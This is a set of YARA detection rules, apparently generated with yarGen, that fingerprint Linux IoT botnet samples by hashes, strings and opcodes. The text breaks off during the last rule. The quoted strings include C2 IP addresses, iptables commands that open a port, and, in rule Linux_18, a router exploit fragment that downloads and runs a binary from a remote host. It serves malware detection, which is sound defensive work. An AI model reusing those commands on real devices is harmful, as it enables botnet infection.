/*
   YARA Rule Set
   Author: yarGen Rule Generator
   Date: 2024-03-27
   Identifier: Linux
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule Linux_1 {
   meta:
      description = "Linux_1"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "06f2e6504b1953035aabfc8d9782800e77591599e6f36e543a042da1a7dc8dda"
   strings:
      $s1 = "N^NuPOST /cdn-cgi/" fullword ascii
      $s2 = "/BQxHoQxB" fullword ascii
      $s3 = "HoPpHoP" fullword ascii
      $s4 = "gTHo(hN" fullword ascii
      $s5 = ":Ho(ta" fullword ascii
      $s6 = "LHo(xa" fullword ascii
      $s7 = "$NuNuNV" fullword ascii
      $s8 = "&/|JR**" fullword ascii
      $s9 = "$Ho(ha" fullword ascii
      $s10 = "RN^NuNV" fullword ascii
      $s11 = " Ho(ha" fullword ascii
      $s12 = "Hw) (xHx" fullword ascii
      $s13 = "tHo(|a" fullword ascii
      $s14 = "N^NuHx" fullword ascii
      $s15 = "L SHx@" fullword ascii
      $s16 = "b(p7 B" fullword ascii
      $s17 = "N^Nu\"/" fullword ascii
      $s18 = "f|f>\"y" fullword ascii
      $s19 = "( @N^NuNV" fullword ascii
      $s20 = "f|N^NuNV" fullword ascii

      $op0 = { 01 48 78 00 18 2f 02 2f 03 61 ff ff ff fb e6 4f }
      $op1 = { ff e2 a8 d8 80 25 44 00 10 0c 6e ff ff ff f4 66 }
      $op2 = { 4e 56 00 00 4a 39 80 01 66 7c 66 3e 22 79 80 01 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_2 {
   meta:
      description = "Linux_2"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "1778537cf4a5c3bc75db6bd25e274ab0607245f6c0ef70fc7db7b38072377737"
   strings:
      $s1 = "N^NuSNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s2 = "$NuNuNV" fullword ascii
      $s3 = "b(p7 B" fullword ascii
      $s4 = "N^Nu o" fullword ascii
      $s5 = "N^Nu 9" fullword ascii
      $s6 = "al$BHx" fullword ascii
      $s7 = "9z(H/<" fullword ascii
      $s8 = "N^NuNuO" fullword ascii

      $op0 = { 06 48 78 00 01 4e 94 24 48 11 7c 00 05 00 04 20 }
      $op1 = { 01 48 78 00 0d 2f 03 2f 02 4e 92 1f 40 00 59 42 }
      $op2 = { 36 7c 00 01 16 02 49 c3 2c 00 4c 47 60 01 24 41 }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( all of them and all of ($op*) )
}

rule Linux_3 {
   meta:
      description = "Linux_3"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "c7e1993166dc1f2650a37a3611d40c4f6ab8372a71135b497709c93341d9bcb6"
   strings:
      $s1 = "$NuNuNV" fullword ascii
      $s2 = "b(p7 B" fullword ascii
      $s3 = "3fnHx@" fullword ascii
      $s4 = "*L,KHx" fullword ascii
      $s5 = "4N^NuNV" fullword ascii
      $s6 = "J~&HHx" fullword ascii
      $s7 = "u2N^NuNV" fullword ascii
      $s8 = " N^NuNV" fullword ascii
      $s9 = "VP$BHx" fullword ascii
      $s10 = "Jp(H/<" fullword ascii
      $s11 = "`:,HHx" fullword ascii
      $s12 = "fJ,HHx" fullword ascii
      $s13 = "]^(H/<" fullword ascii
      $s14 = ":/proc/" fullword ascii
      $s15 = "]l&HHx" fullword ascii

      $op0 = { 4e 56 00 00 4a 39 80 00 ea 34 66 3e 22 79 80 00 }
      $op1 = { 01 48 78 00 04 2f 08 48 78 00 03 42 a7 2f 00 61 }
      $op2 = { ff e2 a8 d8 80 25 44 00 10 70 ff b0 af 00 38 66 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_4 {
   meta:
      description = "Linux_4"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e19c1f199c04c5d4d0c517efd9e0df5e51bd898edad6062485b7a8b0b240fdbb"
   strings:
      $s1 = "N^NuPOST /cdn-cgi/" fullword ascii
      $s2 = "FTPjGNRGP\"" fullword ascii
      $s3 = "FICMUHDKPJKCF" fullword ascii
      $s4 = "LCOGQGPTGP" fullword ascii
      $s5 = "ANMWFDNCPG" fullword ascii
      $s6 = "PGDPGQJ" fullword ascii
      $s7 = "VPCLQDGP" fullword ascii
      $s8 = "CRRNKACVKML" fullword ascii
      $s9 = "AMLLGAVKML" fullword ascii
      $s10 = "NMACVKML" fullword ascii
      $s11 = "AMLVGLV" fullword ascii
      $s12 = "GLAMFKLE" fullword ascii
      $s13 = "LGVQNKLI" fullword ascii
      $s14 = "FGNGVGF" fullword ascii
      $s15 = "185.196.8.32" fullword ascii
      $s16 = "/BQxHoQxB" fullword ascii
      $s17 = "HoPpHoP" fullword ascii
      $s18 = "gTHo(hN" fullword ascii
      $s19 = "/lib/ld-uClibc.so.0" fullword ascii
      $s20 = "libc.so.0" fullword ascii

      $op0 = { ff e2 a8 d8 80 25 44 00 10 0c 6e ff ff ff f4 66 }
      $op1 = { ff 6e 00 1e 34 2f 06 61 ff 00 00 ad 34 58 8f 72 }
      $op2 = { 10 48 6f 51 6c 2f 12 61 ff ff ff f5 4a 24 12 20 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_5 {
   meta:
      description = "Linux_5"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "219658667afd35e2fe3f3f7876dbcf70fa9d7bfa3a13df745edc665ee70928f7"
   strings:
      $s1 = "DN^NuGET / HTTP/1.1" fullword ascii
      $s2 = "B\\f>\"y" fullword ascii
      $s3 = "pSN@-@" fullword ascii
      $s4 = "3fnHx@" fullword ascii
      $s5 = "/fd/B(" fullword ascii
      $s6 = "d,N^NuNV" fullword ascii
      $s7 = "B\\N^NuNV" fullword ascii
      $s8 = "p&N@-@" fullword ascii
      $s9 = "g|`2B." fullword ascii
      $s10 = "wf(H/<" fullword ascii
      $s11 = "wt&HHx" fullword ascii
      $s12 = "8N^NuNV" fullword ascii
      $s13 = "(N^NuNV" fullword ascii
      $s14 = "0N^NuNuNV" fullword ascii
      $s15 = "fb`$B." fullword ascii

      $op0 = { ff e2 a8 d8 80 25 44 00 10 0c 6e ff ff ff f0 66 }
      $op1 = { 80 60 00 fc 34 48 6e ff ba 61 ff 00 00 08 76 24 }
      $op2 = { ff d6 42 ae ff da 60 10 2d 7c 7f ff ff ff ff d6 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_6 {
   meta:
      description = "Linux_6"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "28519cff83b170a84923d8d02f5f5c13e0531431d38e028bb1c53e549f968307"
   strings:
      $s1 = " __get_myaddress: socket" fullword ascii
      $s2 = "DN^NuSNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s3 = "g6 7- " fullword ascii
      $s4 = "fFth D " fullword ascii
      $s5 = "0NuNu\"_ <" fullword ascii
      $s6 = "dNqNuNV" fullword ascii
      $s7 = "\\N^NuNV" fullword ascii
      $s8 = "b(p7 B" fullword ascii
      $s9 = "hN^NuNV" fullword ascii
      $s10 = "`N^NuNV" fullword ascii
      $s11 = "N^Nu o" fullword ascii
      $s12 = "N^Nu 9" fullword ascii
      $s13 = "p*N@-@" fullword ascii
      $s14 = "pjN@-@" fullword ascii
      $s15 = "|N^NuNV" fullword ascii
      $s16 = "?8,/0,Hy" fullword ascii
      $s17 = "b\\N^NuNV" fullword ascii
      $s18 = "g:`R ." fullword ascii
      $s19 = "TN^NuNV" fullword ascii
      $s20 = "gj`p n" fullword ascii

      $op0 = { ff e2 a8 d8 80 25 44 00 10 0c 6e ff ff ff f4 66 }
      $op1 = { 42 a7 2f 00 61 ff ff ff f6 76 4f ef 00 0c 42 b9 }
      $op2 = { 42 a7 2f 00 61 ff ff ff ed 6a 4f ef 00 0c 20 39 }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_7 {
   meta:
      description = "Linux_7"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "1a9fd5bf5738493cf08b81dd7c81a51b510615e1f4491360fce114eeeb377303"
   strings:
      $s1 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" fullword ascii
      $s3 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" fullword ascii
      $s6 = "zkjtjaz" fullword ascii
      $s7 = "J/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xI" ascii
      $s8 = "3/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9" ascii
      $s9 = "A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xF" ascii
      $s10 = "D/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x3" ascii
      $s11 = "8/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x9" ascii
      $s12 = ".+|GET" fullword ascii
      $s13 = "]214.194.12.158" fullword ascii
      $s14 = "zltkaz" fullword ascii
      $s15 = "99?*.`z.?\".u2.76v;**639;.354u\"2.76q\"76v;**639;.354u\"76a+gjtcv37;=?u-?8*vpupa+gjtbZ" fullword ascii
      $s16 = ";<;(3uljktmtmZ" fullword ascii
      $s17 = "2(57?uohtjthmnitkklz" fullword ascii
      $s18 = "3.uljktmtmzr" fullword ascii
      $s19 = "2(57?uoktjthmjntkjiz" fullword ascii
      $s20 = "?()354uctkthz" fullword ascii

      $op0 = { ff 6e 00 1a 8c 2f 06 61 ff 00 00 34 30 58 8f 72 }
      $op1 = { ff ff bc 62 00 00 ca 70 34 d0 ae ff b8 b0 ae ff }
      $op2 = { ff ff bc 63 00 01 6e 72 34 d2 ae ff b8 20 2e ff }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_8 {
   meta:
      description = "Linux_8"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "1cbfdb421a8aba3f65f0f0767bc2e9e92c34703bc1f4d4174dedd5b60f00d66f"
   strings:
      $s1 = "FICMUHDKPJKCF" fullword ascii
      $s2 = "UCVAJFME" fullword ascii
      $s3 = "FGDCWNV" fullword ascii
      $s4 = "LCOGQGPTGP" fullword ascii
      $s5 = "185.196.10.155" fullword ascii
      $s6 = "LAMPPGAV\"" fullword ascii
      $s7 = "vqMWPAG" fullword ascii
      $s8 = "DMWLF\"" fullword ascii
      $s9 = "NKLWZQJGNN\"" fullword ascii
      $s10 = "sWGP[\"" fullword ascii
      $s11 = "GLVGP\"" fullword ascii
      $s12 = "UCVAJFME\"" fullword ascii
      $s13 = "AOFNKLG\"" fullword ascii
      $s14 = "CQQUMPF\"" fullword ascii
      $s15 = "JCICK\"" fullword ascii
      $s16 = "NMACN\"" fullword ascii
      $s17 = "QVCPV\"" fullword ascii
      $s18 = "}UCVAJFME\"" fullword ascii
      $s19 = "GFHICK\"" fullword ascii
      $s20 = "QVCVWQ\"" fullword ascii

      $op0 = { 40 48 78 00 04 2f 02 2f 03 4e 92 1f 40 00 4e 48 }
      $op1 = { 01 48 78 00 05 2f 03 2f 02 4e 92 1f 40 00 4b 2f }
      $op2 = { 01 48 78 00 0d 2f 03 2f 02 4e 92 1f 40 00 59 42 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_9 {
   meta:
      description = "Linux_9"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "5f6fb37ce34ca77a1682f03ff8543a7ae0bbbc9028cce834938daaa0ccd7eba7"
   strings:
      $s1 = "/bin/busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s2 = "/usr/bin/iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s3 = "[modules/system.c] Process (pid=%d path=%s) is malicious" fullword ascii
      $s4 = "bindtoip" fullword ascii
      $s5 = "0bad auth_len gid %d str %d auth %d" fullword ascii
      $s6 = "/proc/%s/fd/" fullword ascii
      $s7 = "Failed to register signal handler for SIGINT" fullword ascii
      $s8 = "/usr/local/sbin/" fullword ascii
      $s9 = "/usr/local/bin/" fullword ascii
      $s10 = "87.246.7.194" fullword ascii
      $s11 = "g6 7- " fullword ascii
      $s12 = "0NuNu\"_ <" fullword ascii
      $s13 = "dNqNuNV" fullword ascii
      $s14 = "RebirthLTD" fullword ascii
      $s15 = "XONuYOH" fullword ascii
      $s16 = "NuNq\"o" fullword ascii
      $s17 = "\\N^NuNV" fullword ascii
      $s18 = "hN^NuNV" fullword ascii
      $s19 = "B@HAH@" fullword ascii
      $s20 = "`N^NuNV" fullword ascii

      $op0 = { ff d6 42 ae ff da 60 10 2d 7c 7f ff ff ff ff d6 }
      $op1 = { 42 a7 2f 00 61 ff ff ff f6 76 4f ef 00 0c 42 b9 }
      $op2 = { 42 a7 2f 00 61 ff ff ff ed 6a 4f ef 00 0c 20 39 }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_10 {
   meta:
      description = "Linux_10"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "7662d17abbed34e67c8e2f70258bb1242b53484442ed9b43acb87e638639181d"
   strings:
      $s1 = "/bin/busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s2 = "/usr/bin/iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s3 = "#h__get_myaddress: socket" fullword ascii
      $s4 = "bindtoip" fullword ascii
      $s5 = "g6 7- " fullword ascii
      $s6 = "0NuNu\"_ <" fullword ascii
      $s7 = "dNqNuNV" fullword ascii
      $s8 = "RebirthLTD" fullword ascii
      $s9 = "XONuYOH" fullword ascii
      $s10 = "NuNq\"o" fullword ascii
      $s11 = "\\N^NuNV" fullword ascii
      $s12 = "hN^NuNV" fullword ascii
      $s13 = "B@HAH@" fullword ascii
      $s14 = "`N^NuNV" fullword ascii
      $s15 = "N^Nu o" fullword ascii
      $s16 = "pSN@-@" fullword ascii
      $s17 = "p&N@-@" fullword ascii
      $s18 = "g|`2B." fullword ascii
      $s19 = "8N^NuNV" fullword ascii
      $s20 = "(N^NuNV" fullword ascii

      $op0 = { ff d6 42 ae ff da 60 10 2d 7c 7f ff ff ff ff d6 }
      $op1 = { 42 a7 2f 00 61 ff ff ff f6 76 4f ef 00 0c 42 b9 }
      $op2 = { 42 a7 2f 00 61 ff ff ff ed 6a 4f ef 00 0c 20 39 }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_11 {
   meta:
      description = "Linux_11"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "a308729f523a3f45d489042da4f2dbdc979f70150bc23b752ad1168ce794c6af"
   strings:
      $s1 = "/bin/busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s2 = "/usr/bin/iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s3 = "[modules/system.c] Process (pid=%d path=%s) is malicious" fullword ascii
      $s4 = "bindtoip" fullword ascii
      $s5 = " bad auth_len gid %d str %d auth %d" fullword ascii
      $s6 = "/proc/%s/fd/" fullword ascii
      $s7 = "Failed to register signal handler for SIGINT" fullword ascii
      $s8 = "/usr/local/sbin/" fullword ascii
      $s9 = "/usr/local/bin/" fullword ascii
      $s10 = "87.246.7.194" fullword ascii
      $s11 = "g6 7- " fullword ascii
      $s12 = "0NuNu\"_ <" fullword ascii
      $s13 = "dNqNuNV" fullword ascii
      $s14 = "RebirthLTD" fullword ascii
      $s15 = "XONuYOH" fullword ascii
      $s16 = "NuNq\"o" fullword ascii
      $s17 = "XONuNuNV" fullword ascii
      $s18 = "\\N^NuNV" fullword ascii
      $s19 = "hN^NuNV" fullword ascii
      $s20 = "B@HAH@" fullword ascii

      $op0 = { ff d6 42 ae ff da 60 10 2d 7c 7f ff ff ff ff d6 }
      $op1 = { 42 a7 2f 00 61 ff ff ff f6 76 4f ef 00 0c 42 b9 }
      $op2 = { 42 a7 2f 00 61 ff ff ff ed 6a 4f ef 00 0c 20 39 }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_12 {
   meta:
      description = "Linux_12"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "bb3a86c39c0dd7cac51dc7dfe6a6006cbee0a33e1e5632b1777837a59b2f0512"
   strings:
      $s1 = "(Killer) >> KILLING PID: (%s)" fullword ascii
      $s2 = "g6 7- " fullword ascii
      $s3 = "b(p7 B" fullword ascii
      $s4 = "(N^NuNV" fullword ascii
      $s5 = "NuNqNV" fullword ascii
      $s6 = "$_&_NuO" fullword ascii
      $s7 = "WD&HHx" fullword ascii
      $s8 = "$_&_NuNV" fullword ascii
      $s9 = "4N^NuNV" fullword ascii
      $s10 = "VN^NuNV" fullword ascii
      $s11 = "N^Nu/proc/" fullword ascii
      $s12 = "Tl&HHx" fullword ascii
      $s13 = "W6(H/<" fullword ascii
      $s14 = "T^(H/<" fullword ascii

      $op0 = { ff e2 a8 d8 80 25 44 00 10 0c 6e ff ff ff f4 66 }
      $op1 = { 4e 56 00 00 4a 39 80 00 de 34 66 3e 22 79 80 00 }
      $op2 = { 06 4e 93 24 08 48 78 00 06 48 79 80 00 af 34 2f }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_13 {
   meta:
      description = "Linux_13"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "24f457794242e6c0cf54ad90feb0e3e5c997556d12d3a06ca5ab44dc60258e31"
   strings:
      $s1 = "N^NuSNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s2 = "g6 7- " fullword ascii
      $s3 = "0NuNu\"_ <" fullword ascii
      $s4 = "dNqNuNV" fullword ascii
      $s5 = "lvrvup9w0zwi6nuqf0kilumln8ox5vgv" fullword ascii
      $s6 = "\\N^NuNV" fullword ascii
      $s7 = "b(p7 B" fullword ascii
      $s8 = "hN^NuNV" fullword ascii
      $s9 = "`N^NuNV" fullword ascii
      $s10 = "N^Nu o" fullword ascii
      $s11 = "N^Nu 9" fullword ascii
      $s12 = "g|`2B." fullword ascii
      $s13 = "8N^NuNV" fullword ascii
      $s14 = "(N^NuNV" fullword ascii
      $s15 = "0N^NuNuNV" fullword ascii
      $s16 = "fb`$B." fullword ascii
      $s17 = "p*N@-@" fullword ascii
      $s18 = "pjN@-@" fullword ascii
      $s19 = "|N^NuNV" fullword ascii
      $s20 = "g:`R ." fullword ascii

      $op0 = { ff d6 42 ae ff da 60 10 2d 7c 7f ff ff ff ff d6 }
      $op1 = { 42 a7 2f 00 61 ff ff ff f6 76 4f ef 00 0c 42 b9 }
      $op2 = { 42 a7 2f 00 61 ff ff ff ed 6a 4f ef 00 0c 20 39 }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_14 {
   meta:
      description = "Linux_14"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "475487bf7b96fe3da321dac0b5f59231651fc3d71f86bf9580bfa77e59b0f2c8"
   strings:
      $s1 = "r bad auth_len gid %d str %d auth %d" fullword ascii
      $s2 = "condi2 %s:%d" fullword ascii
      $s3 = "N^NuSNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s4 = "netstat" fullword ascii
      $s5 = "bot.ppc" fullword ascii
      $s6 = "bot.arm" fullword ascii
      $s7 = "g6 7- " fullword ascii
      $s8 = "0NuNu\"_ <" fullword ascii
      $s9 = "dNqNuNV" fullword ascii
      $s10 = "bot.arm5" fullword ascii
      $s11 = "bot.mips" fullword ascii
      $s12 = "@KZYA\\EL@" fullword ascii
      $s13 = "bot.arm7" fullword ascii
      $s14 = "bot.arm6" fullword ascii
      $s15 = "bot.mpsl" fullword ascii
      $s16 = "\\N^NuNV" fullword ascii
      $s17 = "b(p7 B" fullword ascii
      $s18 = "hN^NuNV" fullword ascii
      $s19 = "`N^NuNV" fullword ascii
      $s20 = ",N^NuNV" fullword ascii

      $op0 = { ff e2 a8 d8 80 25 44 00 10 0c 6e ff ff ff f4 66 }
      $op1 = { 42 a7 2f 00 61 ff ff ff f6 76 4f ef 00 0c 42 b9 }
      $op2 = { 42 a7 2f 00 61 ff ff ff ed 6a 4f ef 00 0c 20 39 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_15 {
   meta:
      description = "Linux_15"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "0f4889491376010d2b777602c988009fc31298e0d5b85b554bdc1c113d6c3171"
   strings:
      $s1 = "__pthread_mutex_unlock_usercnt" fullword ascii
      $s2 = "pthread_mutex_trylock.c" fullword ascii
      $s3 = "pthread_mutex_unlock.c" fullword ascii
      $s4 = "pthread_mutex_lock.c" fullword ascii
      $s5 = "__pthread_mutex_lock_full" fullword ascii
      $s6 = "__pthread_mutex_unlock_full" fullword ascii
      $s7 = "__pthread_mutex_lock_internal" fullword ascii
      $s8 = "pthread_mutex_init.c" fullword ascii
      $s9 = "__pthread_mutex_unlock_internal" fullword ascii
      $s10 = "update_process" fullword ascii
      $s11 = "attack_tcp_bypass" fullword ascii
      $s12 = "hexPayload" fullword ascii
      $s13 = "__make_stacks_executable" fullword ascii
      $s14 = "read_encoded_value_with_base" fullword ascii
      $s15 = "read_encoded_value" fullword ascii
      $s16 = "pthread_getspecific.c" fullword ascii
      $s17 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/unwind-c.c" fullword ascii
      $s18 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc" fullword ascii
      $s19 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s20 = "_thread_db___pthread_keys" fullword ascii

      $op0 = { ef 34 00 00 ea 20 c0 9d e5 18 30 9c e5 00 00 53 }
      $op1 = { ef 00 30 a0 e3 56 f4 ff eb 03 20 a0 e1 18 34 00 }
      $op2 = { 80 ff ff ff ff 00 00 b0 0d 03 00 ff 7f }
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_16 {
   meta:
      description = "Linux_16"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "595a436719c2ac7c441a77af3173629eb7ddfb0e304a27e09dbd19c1a6b4e741"
   strings:
      $s1 = "__pthread_mutex_unlock_usercnt" fullword ascii
      $s2 = "pthread_mutex_trylock.c" fullword ascii
      $s3 = "pthread_mutex_unlock.c" fullword ascii
      $s4 = "pthread_mutex_lock.c" fullword ascii
      $s5 = "__pthread_mutex_lock_full" fullword ascii
      $s6 = "__pthread_mutex_unlock_full" fullword ascii
      $s7 = "__pthread_mutex_lock_internal" fullword ascii
      $s8 = "pthread_mutex_init.c" fullword ascii
      $s9 = "__pthread_mutex_unlock_internal" fullword ascii
      $s10 = "update_process" fullword ascii
      $s11 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s12 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm/pr-support.c" fullword ascii
      $s13 = "__make_stacks_executable" fullword ascii
      $s14 = "read_encoded_value_with_base" fullword ascii
      $s15 = "read_encoded_value" fullword ascii
      $s16 = "pthread_getspecific.c" fullword ascii
      $s17 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm/libunwind.S" fullword ascii
      $s18 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/build-gcc/gcc" fullword ascii
      $s19 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm" fullword ascii
      $s20 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm/unwind-arm.c" fullword ascii

      $op0 = { ef 34 00 00 ea 20 c0 9d e5 18 30 9c e5 00 00 53 }
      $op1 = { 80 ff ff ff ff 00 00 b0 0d 03 00 ff 7f }
      $op2 = { ef 00 30 a0 e3 3f f4 ff eb 03 20 a0 e1 18 34 00 }
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_17 {
   meta:
      description = "Linux_17"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "d50015a8716a82a9def5c2e4ff5ac8e8ca3fb7729c2656aec5b52deb87b1d94e"
   strings:
      $s1 = "__pthread_mutex_unlock_usercnt" fullword ascii
      $s2 = "pthread_mutex_trylock.c" fullword ascii
      $s3 = "pthread_mutex_unlock.c" fullword ascii
      $s4 = "pthread_mutex_lock.c" fullword ascii
      $s5 = "__pthread_mutex_lock_full" fullword ascii
      $s6 = "__pthread_mutex_unlock_full" fullword ascii
      $s7 = "__pthread_mutex_lock_internal" fullword ascii
      $s8 = "pthread_mutex_init.c" fullword ascii
      $s9 = "__pthread_mutex_unlock_internal" fullword ascii
      $s10 = "update_process" fullword ascii
      $s11 = "__make_stacks_executable" fullword ascii
      $s12 = "read_encoded_value_with_base" fullword ascii
      $s13 = "read_encoded_value" fullword ascii
      $s14 = "pthread_getspecific.c" fullword ascii
      $s15 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/unwind-c.c" fullword ascii
      $s16 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc" fullword ascii
      $s17 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s18 = "_thread_db___pthread_keys" fullword ascii
      $s19 = "_thread_db_pthread_key_data_seq" fullword ascii
      $s20 = "_thread_db_pthread_key_struct_destr" fullword ascii

      $op0 = { ef 34 00 00 ea 20 c0 9d e5 18 30 9c e5 00 00 53 }
      $op1 = { 80 ff ff ff ff 00 00 b0 0d 03 00 ff 7f }
      $op2 = { ef 00 30 a0 e3 3f f4 ff eb 03 20 a0 e1 18 34 00 }
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_18 {
   meta:
      description = "Linux_18"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "a032864f9d2a4554884f5f84b3ef1ff5bf44b71c290be32d7c2fcf844d74c0b9"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = " -g 103.188.244.189 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii
      $s3 = "update_process" fullword ascii
